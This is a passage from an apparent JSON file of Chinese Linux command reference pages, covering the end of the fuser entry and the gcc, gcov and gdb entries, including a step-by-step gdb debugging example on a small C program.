id=\"实例\">实例</h3>\n<p>要列出使用<code>/etc/passwd</code>文件的本地进程的进程号，请输入：</p>\n<pre><code class=\"language-shell\">fuser <span class=\"hljs-regexp\">/etc/</span>passwd\n</code></pre>\n<p>要列出使用<code>/etc/filesystems</code>文件的进程的进程号和用户登录名，请输入：</p>\n<pre><code class=\"language-shell\">fuser -u <span class=\"hljs-regexp\">/etc/</span>filesystems\n</code></pre>\n<p>要终止使用给定文件系统的所有进程，请输入：</p>\n<pre><code class=\"language-shell\">fuser -k -x -u -c <span class=\"hljs-regexp\">/dev/</span>hd1  或者  fuser -kxuc /home\n</code></pre>\n<p>任一命令都列出了进程号和用户名，然后终止每个正在使用<code>/dev/hd1 (/home)</code>文件系统的进程。仅有root用户能终止属于另一用户的进程。如果您正在试图卸下<code>/dev/hd1</code>文件系统，而一个正在访问<code>/dev/hd1</code>文件系统的进程不允许这样，您可能希望使用此命令。</p>\n<p>要列出正在使用已从给定文件系统删除的文件的全部进程，请输入：</p>\n<pre><code class=\"language-shell\">fuser -d <span class=\"hljs-string\">/usr</span>文件\n</code></pre>\n<p><code>/dev/kmem</code> 用于系统映像。<br><code>/dev/mem</code>&nbsp; 也用于系统映像。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "gcc",
        "des": "基于C/C++的编译器",
        "body": "<h1 id=\"gcc\">gcc</h1>\n<p>基于C/C++的编译器</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>gcc命令</strong> 使用GNU推出的基于C/C++的编译器，是开放源代码领域应用最广泛的编译器，具有功能强大，编译代码支持性能优化等特点。现在很多程序员都应用GCC，怎样才能更好的应用GCC。目前，GCC可以用来编译C/C++、FORTRAN、JAVA、OBJC、ADA等语言的程序，可根据需要选择安装支持的语言。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">gcc</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-o：指定生成的输出文件；</span>\n<span class=\"hljs-deletion\">-E：仅执行编译预处理；</span>\n<span class=\"hljs-deletion\">-S：将C代码转换为汇编代码；</span>\n<span class=\"hljs-deletion\">-wall：显示警告信息；</span>\n<span class=\"hljs-deletion\">-c：仅执行编译操作，不进行连接操作。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>C源文件：指定C语言源代码文件。</p>\n<h3 id=\"实例\">实例</h3>\n<p><strong>常用编译命令选项</strong> </p>\n<p>假设源程序文件名为test.c</p>\n<p><strong>无选项编译链接</strong> </p>\n<pre><code class=\"language-shell\">gcc <span class=\"hljs-keyword\">test</span>.c\n</code></pre>\n<p>将test.c预处理、汇编、编译并链接形成可执行文件。这里未指定输出文件，默认输出为a.out。</p>\n<p><strong>选项 -o</strong> </p>\n<pre><code class=\"language-shell\">gcc <span class=\"hljs-keyword\">test</span>.c -o <span class=\"hljs-keyword\">test</span>\n</code></pre>\n<p>将test.c预处理、汇编、编译并链接形成可执行文件test。-o选项用来指定输出文件的文件名。</p>\n<p><strong>选项 -E</strong> </p>\n<pre><code class=\"language-shell\">gcc -E <span class=\"hljs-keyword\">test</span>.c -o <span class=\"hljs-keyword\">test</span>.i\n</code></pre>\n<p>将test.c预处理输出test.i文件。</p>\n<p><strong>选项 -S</strong> </p>\n<pre><code class=\"language-shell\">gcc -S <span class=\"hljs-keyword\">test</span>.i\n</code></pre>\n<p>将预处理输出文件test.i汇编成test.s文件。</p>\n<p><strong>选项 -c</strong> </p>\n<pre><code class=\"language-shell\">gcc -c <span class=\"hljs-keyword\">test</span>.s\n</code></pre>\n<p>将汇编输出文件test.s编译输出test.o文件。</p>\n<p><strong>无选项链接</strong> </p>\n<pre><code class=\"language-shell\">gcc <span class=\"hljs-keyword\">test</span>.o -o <span class=\"hljs-keyword\">test</span>\n</code></pre>\n<p>将编译输出文件test.o链接成最终可执行文件test。</p>\n<p><strong>选项 -O</strong> </p>\n<pre><code class=\"language-shell\">gcc -O1 <span class=\"hljs-keyword\">test</span>.c -o <span class=\"hljs-keyword\">test</span>\n</code></pre>\n<p>使用编译优化级别1编译程序。级别为1~3，级别越大优化效果越好，但编译时间越长。</p>\n<p><strong>多源文件的编译方法</strong> </p>\n<p>如果有多个源文件，基本上有两种编译方法：</p>\n<p>假设有两个源文件为test.c和testfun.c</p>\n<p><strong>多个文件一起编译</strong> </p>\n<pre><code class=\"language-shell\">gcc testfun.c <span class=\"hljs-keyword\">test</span>.c -o <span class=\"hljs-keyword\">test</span>\n</code></pre>\n<p>将testfun.c和test.c分别编译后链接成test可执行文件。</p>\n<p><strong>分别编译各个源文件，之后对编译后输出的目标文件链接。</strong> </p>\n<pre><code class=\"language-shell\">gcc -c testfun.c    #将testfun.c编译成testfun.o\ngcc -c <span class=\"hljs-keyword\">test</span>.c       #将<span class=\"hljs-keyword\">test</span>.c编译成<span class=\"hljs-keyword\">test</span>.o\ngcc -o testfun.o <span class=\"hljs-keyword\">test</span>.o -o <span class=\"hljs-keyword\">test</span>    #将testfun.o和<span class=\"hljs-keyword\">test</span>.o链接成<span class=\"hljs-keyword\">test</span>\n</code></pre>\n<p>以上两种方法相比较，第一中方法编译时需要所有文件重新编译，而第二种方法可以只重新编译修改的文件，未修改的文件不用重新编译。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "gcov",
        "des": "测试程序的代码覆盖率的工具",
        "body": "<h1 id=\"gcov\">gcov</h1>\n<p>测试程序的代码覆盖率的工具</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>gcov命令</strong> 是一款测试程序的代码覆盖率的工具。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">gcov</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-h：显示帮助信息；</span>\n<span class=\"hljs-deletion\">-v：显示版本信息；</span>\n<span class=\"hljs-deletion\">-a：输出所有的基本块的执行计数；</span>\n<span class=\"hljs-deletion\">-n：并创建输出文件。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>V语言文件：C语言源代码文件。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "gdb",
        "des": "功能强大的程序调试器",
        "body": "<h1 id=\"gdb\">gdb</h1>\n<p>功能强大的程序调试器</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>gdb命令</strong> 包含在GNU的gcc开发套件中，是功能强大的程序调试器。GDB中的命令固然很多，但我们只需掌握其中十个左右的命令，就大致可以完成日常的基本的程序调试工作。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">gdb</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-cd：设置工作目录；</span>\n<span class=\"hljs-deletion\">-q：安静模式，不打印介绍信息和版本信息；</span>\n<span class=\"hljs-deletion\">-d：添加文件查找路径；</span>\n<span class=\"hljs-deletion\">-x：从指定文件中执行GDB指令；</span>\n<span class=\"hljs-deletion\">-s：设置读取的符号表文件。</span>\n</code></pre>\n<table>\n<thead>\n<tr>\n<th>命令</th>\n<th>解释</th>\n<th>示例</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>file &lt;文件名&gt;</td>\n<td>加载被调试的可执行程序文件。<br> 因为一般都在被调试程序所在目录下执行GDB，因而文本名不需要带路径。</td>\n<td>(gdb) file gdb-sample</td>\n</tr>\n<tr>\n<td>r</td>\n<td>Run的简写，运行被调试的程序。<br> 如果此前没有下过断点，则执行完整个程序；如果有断点，则程序暂停在第一个可用断点处。</td>\n<td>(gdb) r</td>\n</tr>\n<tr>\n<td>c</td>\n<td>Continue的简写，继续执行被调试程序，直至下一个断点或程序结束。</td>\n<td>(gdb) c</td>\n</tr>\n<tr>\n<td>b &lt;行号&gt;<br>b &lt;函数名称&gt;<br>b *&lt;函数名称&gt;<br>b *&lt;代码地址&gt; d [编号]</td>\n<td>b: Breakpoint的简写，设置断点。两可以使用“行号”“函数名称”“执行地址”等方式指定断点位置。 <br> 其中在函数名称前面加“*”符号表示将断点设置在“由编译器生成的prolog代码处”。如果不了解汇编，可以不予理会此用法。 d: Delete breakpoint的简写，删除指定编号的某个断点，或删除所有断点。断点编号从1开始递增。</td>\n<td>(gdb) b 8(gdb) b main <br> (gdb) b *main <br> (gdb) b *0x804835c (gdb) d</td>\n</tr>\n<tr>\n<td>s, n</td>\n<td>s: 执行一行源程序代码，如果此行代码中有函数调用，则进入该函数；<br> n: 执行一行源程序代码，此行代码中的函数调用也一并执行。 s 相当于其它调试器中的“Step Into (单步跟踪进入)”；<br> n 相当于其它调试器中的“Step Over (单步跟踪)”。 这两个命令必须在有源代码调试信息的情况下才可以使用（GCC编译时使用“-g”参数）。</td>\n<td>(gdb) s <br> (gdb) n</td>\n</tr>\n<tr>\n<td>si, ni</td>\n<td>si命令类似于s命令，ni命令类似于n命令。所不同的是，这两个命令（si/ni）所针对的是汇编指令，而s/n针对的是源代码。</td>\n<td>(gdb) si <br>(gdb) ni</td>\n</tr>\n<tr>\n<td>p &lt;变量名称&gt;</td>\n<td>Print的简写，显示指定变量（临时变量或全局变量）的值。</td>\n<td>(gdb) p i <br> (gdb) p nGlobalVar</td>\n</tr>\n<tr>\n<td>display ... undisplay &lt;编号&gt;</td>\n<td>display，设置程序中断后欲显示的数据及其格式。 <br> 例如，如果希望每次程序中断后可以看到即将被执行的下一条汇编指令，可以使用命令 <br> “display /i $pc” <br> 其中 $pc 代表当前汇编指令，/i 表示以十六进行显示。当需要关心汇编代码时，此命令相当有用。 undispaly，取消先前的display设置，编号从1开始递增。</td>\n<td>(gdb) display /i $pc (gdb) undisplay 1</td>\n</tr>\n<tr>\n<td>i</td>\n<td>info的简写，用于显示各类信息，详情请查阅“help i”。</td>\n<td>(gdb) i r</td>\n</tr>\n<tr>\n<td>q</td>\n<td>Quit的简写，退出GDB调试环境。</td>\n<td>(gdb) q</td>\n</tr>\n<tr>\n<td>help [命令名称]</td>\n<td>GDB帮助命令，提供对GDB名种命令的解释说明。<br> 如果指定了“命令名称”参数，则显示该命令的详细说明；如果没有指定参数，则分类显示所有GDB命令，供用户进一步浏览和查询。</td>\n<td>(gdb) help</td>\n</tr>\n</tbody></table>\n<h3 id=\"参数\">参数</h3>\n<p>文件：二进制可执行程序。</p>\n<h3 id=\"实例\">实例</h3>\n<p>以下是linux下dgb调试的一个实例，先给出一个示例用的小程序，C语言代码：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\">#include &lt;stdio.h&gt;</span>\n<span class=\"hljs-keyword\">int</span> nGlobalVar = <span class=\"hljs-number\">0</span>;\n\n<span class=\"hljs-keyword\">int</span> tempFunction(<span class=\"hljs-keyword\">int</span> a, <span class=\"hljs-keyword\">int</span> b)\n{\n    <span class=\"hljs-keyword\">printf</span>(<span class=\"hljs-string\">\"tempFunction is called, a = %d, b = %d /n\"</span>, a, b);\n    <span class=\"hljs-keyword\">return</span> (a + b);\n}\n\n<span class=\"hljs-keyword\">int</span> main()\n{\n    <span class=\"hljs-keyword\">int</span> n;\n        n = <span class=\"hljs-number\">1</span>;\n        n++;\n        n--;\n\n        nGlobalVar += <span class=\"hljs-number\">100</span>;\n        nGlobalVar -= <span class=\"hljs-number\">12</span>;\n\n    <span class=\"hljs-keyword\">printf</span>(<span class=\"hljs-string\">\"n = %d, nGlobalVar = %d /n\"</span>, n, nGlobalVar);\n\n        n = tempFunction(<span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">2</span>);\n    <span class=\"hljs-keyword\">printf</span>(<span class=\"hljs-string\">\"n = %d\"</span>, n);\n\n    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;\n}\n</code></pre>\n<p>请将此代码复制出来并保存到文件 gdb-sample.c 中，然后切换到此文件所在目录，用GCC编译之：</p>\n<pre><code class=\"language-shell\">gcc gdb-<span class=\"hljs-keyword\">sample</span>.c -o gdb-<span class=\"hljs-keyword\">sample</span> -g\n</code></pre>\n<p>在上面的命令行中，使用 -o 参数指定了编译生成的可执行文件名为 gdb-sample，使用参数 -g 表示将源代码信息编译到可执行文件中。如果不使用参数 -g，会给后面的GDB调试造成不便。当然，如果我们没有程序的源代码，自然也无从使用 -g 参数，调试/跟踪时也只能是汇编代码级别的调试/跟踪。</p>\n<p>下面“gdb”命令启动GDB，将首先显示GDB说明，不管它：</p>\n<pre><code class=\"language-shell\">GNU gdb Red Hat Linux (<span class=\"hljs-number\">5.3</span>post<span class=\"hljs-number\">-0.20021129</span><span class=\"hljs-number\">.18</span>rh)\nCopyright <span class=\"hljs-number\">2003</span> free Software Foundation, Inc.\nGDB <span class=\"hljs-keyword\">is</span> free software, covered <span class=\"hljs-keyword\">by</span> the GNU General <span class=\"hljs-built_in\">Public</span> License, <span class=\"hljs-keyword\">and</span> you are\nwelcome <span class=\"hljs-keyword\">to</span> change it <span class=\"hljs-keyword\">and</span>/<span class=\"hljs-keyword\">or</span> distribute copies <span class=\"hljs-keyword\">of</span> it under certain conditions.\n<span class=\"hljs-keyword\">type</span> \"show copying\" <span class=\"hljs-keyword\">to</span> see the conditions.\nThere <span class=\"hljs-keyword\">is</span> absolutely <span class=\"hljs-keyword\">no</span> warranty <span class=\"hljs-keyword\">for</span> GDB. <span class=\"hljs-keyword\">Type</span> \"show warranty\" <span class=\"hljs-keyword\">for</span> details.\nThis GDB was configured <span class=\"hljs-keyword\">as</span> \"i386-redhat-linux-gnu\".\n(gdb)\n</code></pre>\n<p>上面最后一行“(gdb)”为GDB内部命令引导符，等待用户输入GDB命令。</p>\n<p>下面使用“file”命令载入被调试程序 gdb-sample（这里的 gdb-sample 即前面 GCC 编译输出的可执行文件）：</p>\n<pre><code class=\"language-shell\">(gdb) <span class=\"hljs-keyword\">file</span> gdb-sample\n<span class=\"hljs-function\"><span class=\"hljs-title\">Reading</span></span> symbols from gdb-sample...done.\n</code></pre>\n<p>上面最后一行提示已经加载成功。</p>\n<p>下面使用“r”命令执行（Run）被调试文件，因为尚未设置任何断点，将直接执行到程序结束：</p>\n<pre><code class=\"language-shell\">(gdb) r\nStarting program: <span class=\"hljs-regexp\">/home/</span>liigo<span class=\"hljs-regexp\">/temp/</span>test_jmp<span class=\"hljs-regexp\">/test_jmp/g</span>db-sample\nn = <span class=\"hljs-number\">1</span>, nGlobalVar = <span class=\"hljs-number\">88</span>\ntempFunction is called, a = <span class=\"hljs-number\">1</span>, b = <span class=\"hljs-number\">2</span>\nn = <span class=\"hljs-number\">3</span>\nProgram exited normally.\n</code></pre>\n<p>下面使用“b”命令在 main 函数开头设置一个断点（Breakpoint）：</p>\n<pre><code class=\"language-shell\">(gdb) b main\nBreakpoint <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">at</span> <span class=\"hljs-number\">0x804835c</span>: <span class=\"hljs-built_in\">file</span> gdb-sample.c, <span class=\"hljs-built_in\">line</span> <span class=\"hljs-number\">19.</span>\n</code></pre>\n<p>上面最后一行提示已经成功设置断点，并给出了该断点信息：在源文件 gdb-sample.c 第19行处设置断点；这是本程序的第一个断点（序号为1）；断点处的代码地址为 0x804835c（此值可能仅在本次调试过程中有效）。回过头去看源代码，第19行中的代码为“n = 1”，恰好是 main 函数中的第一个可执行语句（前面的“int n;”为变量定义语句，并非可执行语句）。</p>\n<p>再次使用“r”命令执行（Run）被调试程序：</p>\n<pre><code class=\"language-shell\">(gdb) r\nStarting program: <span class=\"hljs-regexp\">/home/</span>liigo<span class=\"hljs-regexp\">/temp/g</span>db-sample\n\nBreakpoint <span class=\"hljs-number\">1</span>, main () at gdb-sample.c:<span class=\"hljs-number\">19</span>\n<span class=\"hljs-number\">19</span> n = <span class=\"hljs-number\">1</span>;\n</code></pre>\n<p>程序中断在gdb-sample.c第19行处，即main函数是第一个可执行语句处。</p>\n<p>上面最后一行信息为：下一条将要执行的源代码为“n = 1;”，它是源代码文件gdb-sample.c中的第19行。</p>\n<p>下面使用“s”命令（Step）执行下一行代码（即第19行“n = 1;”）：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\">(gdb)</span> <span class=\"hljs-comment\">s</span>\n<span class=\"hljs-comment\">20</span> <span class=\"hljs-comment\">n</span>++<span class=\"hljs-comment\">;</span>\n</code></pre>\n<p>上面的信息表示已经执行完“n = 1;”，并显示下一条要执行的代码为第20行的“n++;”。</p>\n<p>既然已经执行了“n = 1;”，即给变量 n 赋值为 1，那我们用“p”命令（Print）看一下变量 n 的值是不是 1 ：</p>\n<pre><code class=\"language-shell\">(gdb) p n\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">$1</span> = 1</span>\n</code></pre>\n<p>果然是 1。（$1大致是表示这是第一次使用“p”命令——再次执行“p n”将显示“$2 = 1”——此信息应该没有什么用处。）</p>\n<p>下面我们分别在第26行、tempFunction 函数开头各设置一个断点（分别使用命令“b 26”“b tempFunction”）：</p>\n<pre><code class=\"language-shell\">(gdb) b <span class=\"hljs-number\">26</span>\nBreakpoint <span class=\"hljs-number\">2</span> <span class=\"hljs-keyword\">at</span> <span class=\"hljs-number\">0x804837b</span>: <span class=\"hljs-built_in\">file</span> gdb-sample.c, <span class=\"hljs-built_in\">line</span> <span class=\"hljs-number\">26.</span>\n(gdb) b tempFunction\nBreakpoint <span class=\"hljs-number\">3</span> <span class=\"hljs-keyword\">at</span> <span class=\"hljs-number\">0x804832e</span>: <span class=\"hljs-built_in\">file</span> gdb-sample.c, <span class=\"hljs-built_in\">line</span> <span class=\"hljs-number\">12.</span>\n</code></pre>\n<p>使用“c”命令继续（Continue）执行被调试程序，程序将中断在第二 个断点（26行），此时全局变量 nGlobalVar 的值应该是 88；再一次执行“c”命令，程序将中断于第三个断点（12行，tempFunction 函数开头处），此时tempFunction 函数的两个参数 a、b 的值应分别是 1 和 2：</p>\n<pre><code class=\"language-shell\">(gdb) c\nContinuing.\n\nBreakpoint <span class=\"hljs-number\">2</span>, main () at gdb-sample.c:<span class=\"hljs-number\">26</span>\n<span class=\"hljs-number\">26</span> <span class=\"hljs-keyword\">printf</span>(<span class=\"hljs-string\">\"n = %d, nGlobalVar = %d /n\"</span>, n, nGlobalVar);\n(gdb) p nGlobalVar\n$2 = <span class=\"hljs-number\">88</span>\n(gdb) c\nContinuing.\nn = <span class=\"hljs-number\">1</span>, nGlobalVar = <span class=\"hljs-number\">88</span>\n\nBreakpoint <span class=\"hljs-number\">3</span>, tempFunction (a=<span class=\"hljs-number\">1</span>, b=<span class=\"hljs-number\">2</span>) at gdb-sample.c:<span class=\"hljs-number\">12</span>\n<span class=\"hljs-number\">12</span> <span class=\"hljs-keyword\">printf</span>(<span class=\"hljs-string\">\"tempFunction is called, a = %d, b = %d /n\"</span>, a, b);\n(gdb) p a\n$3 = <span class=\"hljs-number\">1</span>\n(gdb) p b\n$4 = <span class=\"hljs-number\">2</span>\n</code></pre>\n<p>上面反馈的信息一切都在我们预料之中~~</p>\n<p>再一次执行“c”命令（Continue），因为后面再也没有其它断点，程序将一直执行到结束：</p>\n<pre><code class=\"language-shell\">(gdb) c\nContinuing.\ntempFunction <span class=\"hljs-keyword\">is</span> called, a <span class=\"hljs-built_in\">=</span> <span class=\"hljs-number\">1</span>, b <span class=\"hljs-built_in\">=</span> <span class=\"hljs-number\">2</span>\nn <span class=\"hljs-built_in\">=</span> <span class=\"hljs-number\">3</span>\nProgram exited normally.\n</code></pre>\n<p>有时候需要看到编译器生成的汇编代码，以进行汇编级的调试或跟踪，又该如何操作呢？</p>\n<p>这就要用到display命令“display /i $pc”了（此命令前面已有详细解释）：</p>\n<pre><code class=\"language-shell\">(gdb) <span class=\"hljs-keyword\">display</span> /i <span class=\"hljs-symbol\">$</span>pc\n(gdb)\n</code></pre>\n<p>此后程序再中断时，就可以显示出汇编代码了：</p>\n<pre><code class=\"language-shell\">(gdb) r\nStarting program: <span class=\"hljs-regexp\">/home/</span>liigo<span class=\"hljs-regexp\">/temp/</span>test_jmp<span class=\"hljs-regexp\">/test_jmp/g</span>db-sample\n\nBreakpoint <span class=\"hljs-number\">1</span>, main () at gdb-sample.c:<span class=\"hljs-number\">19</span>\n<span class=\"hljs-number\">19</span> n = <span class=\"hljs-number\">1</span>;\n<span class=\"hljs-number\">1</span>: x/i <span class=\"hljs-variable\">$pc</span> <span class=\"hljs-number\">0</span>x804835c &lt;main+<span class=\"hljs-number\">16</span>&gt;: movl <span class=\"hljs-variable\">$0x1</span>,<span class=\"hljs-number\">0</span>xfffffffc(%ebp)\n</code></pre>\n<p>看到了汇编代码，“n = 1;”对应的汇编代码是“movl $0x1,0xfffffffc(%ebp)”。</p>\n<p>并且以后程序每次中断都将显示下一条汇编指定（“si”命令用于执行一条汇编代码——区别于“s”执行一行C代码）：</p>\n<pre><code class=\"language-shell\">(gdb) <span class=\"hljs-built_in\">si</span>\n<span class=\"hljs-number\">20</span> n++;\n<span class=\"hljs-number\">1</span>: x/i <span class=\"hljs-variable\">$pc</span> <span class=\"hljs-number\">0</span>x8048363 &lt;main+<span class=\"hljs-number\">23</span>&gt;: lea <span class=\"hljs-number\">0</span>xfffffffc(%<span class=\"hljs-built_in\">ebp</span>),%eax\n(gdb) <span class=\"hljs-built_in\">si</span>\n<span class=\"hljs-number\">0</span>x08048366 <span class=\"hljs-number\">20</span> n++;\n<span class=\"hljs-number\">1</span>: x/i <span class=\"hljs-variable\">$pc</span> <span class=\"hljs-number\">0</span>x8048366 &lt;main+<span class=\"hljs-number\">26</span>&gt;: incl (%eax)\n(gdb) <span class=\"hljs-built_in\">si</span>\n<span class=\"hljs-number\">21</span> n--;\n<span class=\"hljs-number\">1</span>: x/i <span class=\"hljs-variable\">$pc</span> <span class=\"hljs-number\">0</span>x8048368 &lt;main+<span class=\"hljs-number\">28</span>&gt;: lea <span class=\"hljs-number\">0</span>xfffffffc(%<span class=\"hljs-built_in\">ebp</span>),%eax\n(gdb) <span class=\"hljs-built_in\">si</span>\n<span class=\"hljs-number\">0</span>x0804836b <span class=\"hljs-number\">21</span> n--;\n<span class=\"hljs-number\">1</span>: x/i <span class=\"hljs-variable\">$pc</span> <span class=\"hljs-number\">0</span>x804836b &lt;main+<span class=\"hljs-number\">31</span>&gt;: decl (%eax)\n(gdb) <span class=\"hljs-built_in\">si</span>\n<span class=\"hljs-number\">23</span> nGlobalVar += <span class=\"hljs-number\">100</span>;\n<span class=\"hljs-number\">1</span>: x/i <span class=\"hljs-variable\">$pc</span> <span class=\"hljs-number\">0</span>x804836d &lt;main+<span class=\"hljs-number\">33</span>&gt;: addl <span class=\"hljs-variable\">$0x64</span>,<span class=\"hljs-number\">0</span>x80494<span class=\"hljs-built_in\">fc</span>\n</code></pre>\n<p>接下来我们试一下命令“b *&lt;函数名称&gt;”。</p>\n<p>为了更简明，有必要先删除目前所有断点（使用“d”命令——Delete breakpoint）：</p>\n<pre><code class=\"language-shell\">(gdb) d\nDelete all breakpoints? (y or n) y\n(gdb)\n</code></pre>\n<p>当被询问是否删除所有断点时，输入“y”并按回车键即可。</p>\n<p>下面使用命令“b *main”在 main 函数的 prolog 代码处设置断点（prolog、epilog，分别表示编译器在每个函数的开头和结尾自行插入的代码）：</p>\n<pre><code class=\"language-shell\">(gdb) b *main\nBreakpoint <span class=\"hljs-number\">4</span> at <span class=\"hljs-number\">0x804834c</span>: file gdb-sample.c, line <span class=\"hljs-number\">17</span>.\n(gdb) r\nThe program being debugged has been started already.\nStart it from the beginning? (<span class=\"hljs-keyword\">y</span> <span class=\"hljs-keyword\">or</span> n) <span class=\"hljs-keyword\">y</span>\nStarting program: <span class=\"hljs-regexp\">/home/liig</span>o/temp/test_jmp/test_jmp/gdb-sample\n\nBreakpoint <span class=\"hljs-number\">4</span>, main () at gdb-sample.c:<span class=\"hljs-number\">17</span>\n<span class=\"hljs-number\">17</span> {\n<span class=\"hljs-number\">1</span>: <span class=\"hljs-keyword\">x</span>/i $pc <span class=\"hljs-number\">0x804834c</span> &lt;main&gt;: <span class=\"hljs-keyword\">push</span> %ebp\n(gdb) si\n<span class=\"hljs-number\">0x0804834d</span> <span class=\"hljs-number\">17</span> {\n<span class=\"hljs-number\">1</span>: <span class=\"hljs-keyword\">x</span>/i $pc <span class=\"hljs-number\">0x804834d</span> &lt;main+<span class=\"hljs-number\">1</span>&gt;: mov %esp,%ebp\n(gdb) si\n<span class=\"hljs-number\">0x0804834f</span> in main () at gdb-sample.c:<span class=\"hljs-number\">17</span>\n<span class=\"hljs-number\">17</span> {\n<span class=\"hljs-number\">1</span>: <span class=\"hljs-keyword\">x</span>/i $pc <span class=\"hljs-number\">0x804834f</span> &lt;main+<span class=\"hljs-number\">3</span>&gt;: <span class=\"hljs-function\"><span class=\"hljs-keyword\">sub</span> $0<span class=\"hljs-title\">x8</span>,%<span class=\"hljs-title\">esp</span>\n(<span class=\"hljs-title\">gdb</span>) <span class=\"hljs-title\">si</span>\n0<span class=\"hljs-title\">x08048352</span> 17 </span>{\n<span class=\"hljs-number\">1</span>: <span class=\"hljs-keyword\">x</span>/i $pc <span class=\"hljs-number\">0x8048352</span> &lt;main+<span class=\"hljs-number\">6</span>&gt;: <span class=\"hljs-keyword\">and</span> $0xfffffff<span class=\"hljs-number\">0</span>,%esp\n(gdb) si\n<span class=\"hljs-number\">0x08048355</span> <span class=\"hljs-number\">17</span> {\n<span class=\"hljs-number\">1</span>: <span class=\"hljs-keyword\">x</span>/i $pc <span class=\"hljs-number\">0x8048355</span> &lt;main+<span class=\"hljs-number\">9</span>&gt;: mov $0<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">0</span>,%eax\n(gdb) si\n<span class=\"hljs-number\">0x0804835a</span> <span class=\"hljs-number\">17</span> {\n<span class=\"hljs-number\">1</span>: <span class=\"hljs-keyword\">x</span>/i $pc <span class=\"hljs-number\">0x804835a</span> &lt;main+<span class=\"hljs-number\">14</span>&gt;: <span class=\"hljs-function\"><span class=\"hljs-keyword\">sub</span> %<span class=\"hljs-title\">eax</span>,%<span class=\"hljs-title\">esp</span>\n(<span class=\"hljs-title\">gdb</span>) <span class=\"hljs-title\">si</span>\n19 <span class=\"hljs-title\">n</span> = 1</span>;\n<span class=\"hljs-number\">1</span>: <span class=\"hljs-keyword\">x</span>/i $pc <span class=\"hljs-number\">0x804835c</span> &lt;main+<span class=\"hljs-number\">16</span>&gt;: movl $0x1,<span class=\"hljs-number\">0xfffffffc</span>(%ebp)\n</code></pre>\n<p>此时可以使用“i r”命令显示寄存器中的当前值———“i r”即“Infomation Register”：</p>\n<pre><code class=\"language-shell\">(gdb) i r\n<span class=\"hljs-built_in\">eax</span> <span class=\"hljs-number\">0xbffff6a4</span> -<span class=\"hljs-number\">1073744220</span>\n<span class=\"hljs-built_in\">ecx</span> <span class=\"hljs-number\">0x42015554</span> <span class=\"hljs-number\">1107383636</span>\n<span class=\"hljs-built_in\">edx</span> <span class=\"hljs-number\">0x40016bc8</span> <span class=\"hljs-number\">1073834952</span>\n<span class=\"hljs-built_in\">ebx</span> <span class=\"hljs-number\">0x42130a14</span> <span class=\"hljs-number\">1108544020</span>\n<span class=\"hljs-built_in\">esp</span> <span class=\"hljs-number\">0xbffff6a0</span> <span class=\"hljs-number\">0xbffff6a0</span>\n<span class=\"hljs-built_in\">ebp</span> <span class=\"hljs-number\">0xbffff6a8</span> <span class=\"hljs-number\">0xbffff6a8</span>\n<span class=\"hljs-built_in\">esi</span> <span class=\"hljs-number\">0x40015360</span> <span class=\"hljs-number\">1073828704</span>\n<span class=\"hljs-built_in\">edi</span> <span class=\"hljs-number\">0x80483f0</span> <span class=\"hljs-number\">134513648</span>\n<span class=\"hljs-built_in\">eip</span> <span class=\"hljs-number\">0x8048366</span> <span class=\"hljs-number\">0x8048366</span>\neflags <span class=\"hljs-number\">0x386</span> <span class=\"hljs-number\">902</span>\n<span class=\"hljs-built_in\">cs</span> <span class=\"hljs-number\">0x23</span> <span class=\"hljs-number\">35</span>\n<span class=\"hljs-built_in\">ss</span> <span class=\"hljs-number\">0x2b</span> <span class=\"hljs-number\">43</span>\n<span class=\"hljs-built_in\">ds</span> <span class=\"hljs-number\">0x2b</span> <span class=\"hljs-number\">43</span>\n<span class=\"hljs-built_in\">es</span> <span class=\"hljs-number\">0x2b</span> <span class=\"hljs-number\">43</span>\n<span class=\"hljs-built_in\">fs</span> <span class=\"hljs-number\">0x0</span> <span class=\"hljs-number\">0</span>\n<span class=\"hljs-built_in\">gs</span> <span class=\"hljs-number\">0x33</span> <span class=\"hljs-number\">51</span>\n</code></pre>\n<p>当然也可以显示任意一个指定的寄存器值：</p>\n<pre><code class=\"language-shell\">(gdb) i r <span class=\"hljs-built_in\">eax</span>\n<span class=\"hljs-built_in\">eax</span> <span class=\"hljs-number\">0xbffff6a4</span> -<span class=\"hljs-number\">1073744220</span>\n</code></pre>\n<p>最后一个要介绍的命令是“q”，退出（Quit）GDB调试环境：</p>\n<pre><code class=\"language-shell\">(gdb) q\nThe program is running. <span class=\"hljs-keyword\">exit</span> anyway? (y or n)\n</code></pre>\n<h2 id=\"补充内容\">补充内容</h2>\n<blockquote>\n<p>gdb 教程：<a 